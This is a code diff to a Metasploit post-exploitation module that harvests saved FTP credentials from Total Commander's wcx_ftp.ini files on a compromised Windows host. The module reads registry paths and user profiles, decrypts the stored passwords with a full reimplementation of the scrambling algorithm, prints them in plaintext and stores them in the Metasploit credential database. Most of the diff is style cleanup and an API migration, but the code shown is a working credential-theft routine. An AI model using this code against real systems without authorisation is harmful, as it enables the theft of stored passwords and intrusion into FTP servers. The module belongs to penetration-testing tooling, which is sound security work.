@@ -31,7 +31,7 @@ class Metasploit3 < Msf::Post
   end
 
   def run
-    print_status("Checking Default Locations...")
+    print_status('Checking default locations...')
     check_systemroot
 
     grab_user_profiles().each do |user|
@@ -45,20 +45,20 @@ class Metasploit3 < Msf::Post
     hklmpath = registry_getvaldata(commander_key, 'FtpIniName')
     case hklmpath
     when nil
-      print_status("Total Commander Does not Appear to be Installed Globally")
-    when "wcx_ftp.ini"
-      print_status("Already Checked SYSTEMROOT")
-    when ".\\wcx_ftp.ini"
+      print_status('Total Commander does not appear to be installed globally')
+    when 'wcx_ftp.ini'
+      print_status('Already checked SYSTEMROOT')
+    when '.\\wcx_ftp.ini'
       hklminstpath = registry_getvaldata(commander_key, 'InstallDir') || ''
       if hklminstpath.empty?
-        print_error("Unable to find InstallDir in registry, skipping wcx_ftp.ini")
+        print_error('Unable to find InstallDir in registry, skipping wcx_ftp.ini')
       else
-        check_other(hklminstpath +'\\wcx_ftp.ini')
+        check_other(hklminstpath + '\\wcx_ftp.ini')
       end
     when /APPDATA/
-      print_status("Already Checked AppData")
+      print_status('Already checked AppData')
     when /USERPROFILE/
-      print_status("Already Checked USERPROFILE")
+      print_status('Already checked USERPROFILE')
     else
       check_other(hklmpath)
     end
@@ -72,21 +72,21 @@ class Metasploit3 < Msf::Post
       print_status("HKUP: #{hkupath}")
       case hkupath
       when nil
-        print_status("Total Commander Does not Appear to be Installed on This User")
-      when "wcx_ftp.ini"
-        print_status("Already Checked SYSTEMROOT")
-      when ".\\wcx_ftp.ini"
+        print_status('Total Commander does not appear to be installed for the current user')
+      when 'wcx_ftp.ini'
+        print_status('Already Checked SYSTEMROOT')
+      when '.\\wcx_ftp.ini'
         hklminstpath = registry_getvaldata(profile_commander_key, 'InstallDir') || ''
         if hklminstpath.empty?
-          print_error("Unable to find InstallDir in registry, skipping wcx_ftp.ini")
+          print_error('Unable to find InstallDir in registry, skipping wcx_ftp.ini')
         else
-          check_other(hklminstpath +'\\wcx_ftp.ini')
+          check_other(hklminstpath + '\\wcx_ftp.ini')
         end
       when /APPDATA/
-        print_status("Already Checked AppData")
+        print_status('Already checked AppData')
 
       when /USERPROFILE/
-        print_status("Already Checked USERPROFILE")
+        print_status('Already checked USERPROFILE')
       else
         check_other(hkupath)
       end
@@ -94,7 +94,6 @@ class Metasploit3 < Msf::Post
     unload_our_hives(userhives)
 
   end
-
 
   def check_userdir(path)
     filename = "#{path}\\wcx_ftp.ini"
@@ -107,7 +106,7 @@ class Metasploit3 < Msf::Post
   end
 
   def check_systemroot
-    winpath = expand_path("%SYSTEMROOT%\\wcx_ftp.ini")
+    winpath = expand_path('%SYSTEMROOT%\\wcx_ftp.ini')
     check_other(winpath)
   end
 
@@ -126,7 +125,7 @@ class Metasploit3 < Msf::Post
     ini=Rex::Parser::Ini.from_s(parse)
 
     ini.each_key do |group|
-      next if group=="General" or group == "default" or group=="connections"
+      next if group == "General" or group == "default" or group == "connections"
       print_status("Processing Saved Session #{group}")
       host = ini[group]['host']
 
@@ -136,78 +135,95 @@ class Metasploit3 < Msf::Post
       passwd = decrypt(passwd)
       (host,port) = host.split(':')
       port=21 if port==nil
-      print_good("*** Host: #{host} Port: #{port} User: #{username}  Password: #{passwd} ***")
-      if session.db_record
-        source_id = session.db_record.id
-      else
-        source_id = nil
-      end
-      report_auth_info(
-        :host  => host,
-        :port => port,
-        :sname => 'ftp',
-        :source_id => source_id,
-        :source_type => "exploit",
-        :user => username,
-        :pass => passwd
+      print_good("Host: #{host} Port: #{port} User: #{username}  Password: #{passwd}")
+
+      report_creds(
+        ip: host,
+        port: port,
+        user: username,
+        password: passwd,
+        service_name: 'ftp'
       )
     end
   end
 
+  def report_creds(opts)
+    service_data = {
+      address: opts[:ip],
+      port: opts[:port],
+      service_name: opts[:service_name],
+      protocol: 'tcp',
+      workspace_id: myworkspace_id
+    }
+
+    credential_data = {
+      post_reference_name: self.refname,
+      session_id: session_db_id,
+      origin_type: :session,
+      private_data: opts[:password],
+      private_type: :password,
+      username: opts[:user]
+    }.merge(service_data)
+
+    login_data = {
+      core: create_credential(credential_data),
+      status: Metasploit::Model::Login::Status::UNTRIED,
+    }.merge(service_data)
+
+  create_credential_login(login_data)
+  end
+
   def seed(nMax)
-    @vseed = ((@vseed * 0x8088405) & 0xffffffff) +1
+    @vseed = ((@vseed * 0x8088405) & 0xffffffff) + 1
     return (((@vseed * nMax) >> 32)& 0xffffffff)
   end
 
   def shift(n1, n2)
-    first= (n1 << n2) & 0xffffffff
+    first = (n1 << n2) & 0xffffffff
     second = (n1 >> (8 - n2)) & 0xffffffff
     retval= (first | second) &  0xff
     return retval
   end
 
-  def decrypt(pwd)
+  def decrypt(enc_password)
 
-    pwd2=[]
+    # place_holder_1 is the first place holder for intermediate decryption result
+    place_holder_1 = []
+    enc_password.scan(/../) { |a| place_holder_1 << (a.to_i 16) }
+    len = (place_holder_1.length) - 4
 
-    pwd.scan(/../) { |a| pwd2 << (a.to_i 16) }
-
-    len= (pwd2.length) -4
-
-    pwd3=[]
+    # place_holder_2 is the second place holder for intermediate decryption results
+    place_holder_2 = []
     @vseed = 849521
-    pwd2.each do |a|
-      blah = seed(8)
-      blah2 = shift(a, blah)
-      pwd3 << blah2
+    place_holder_1.each do |a|
+      shifted_seed = shift(a, seed(8))
+      place_holder_2 << shifted_seed
     end
 
-    @vseed =12345
+    @vseed = 12345
     (0..255).each do |i|
-      a=seed(len)
-      b=seed(len)
-      t=pwd3[a]
-      pwd3[a] = pwd3[b]
-      pwd3[b]=t
+      a = seed(len)
+      b = seed(len)
+      # t is the temp variable for storing intermediate result of swap operation
+      t = place_holder_2[a]
+      place_holder_2[a] = place_holder_2[b]
+      place_holder_2[b] = t
     end
 
-
-    @vseed =42340
+    @vseed = 42340
     (0..len).each do |i|
-      pwd3[i] = (pwd3[i] ^ seed(256)) & 0xff
+      place_holder_2[i] = (place_holder_2[i] ^ seed(256)) & 0xff
     end
 
-
-    @vseed =54321
+    @vseed = 54321
     (0..len).each do |i|
-      foo = seed(256)
-      pwd3[i] =  (pwd3[i] - foo) & 0xff
+      seed = seed(256)
+      place_holder_2[i] = (place_holder_2[i] - seed) & 0xff
     end
 
-
-    fpwd=""
-    pwd3[0,len].map{|a| fpwd << a.chr}
-    return fpwd
+    decrypted_password = ""
+    place_holder_2[0,len].map{ |a| decrypted_password << a.chr }
+    return decrypted_password
 
   end
 end
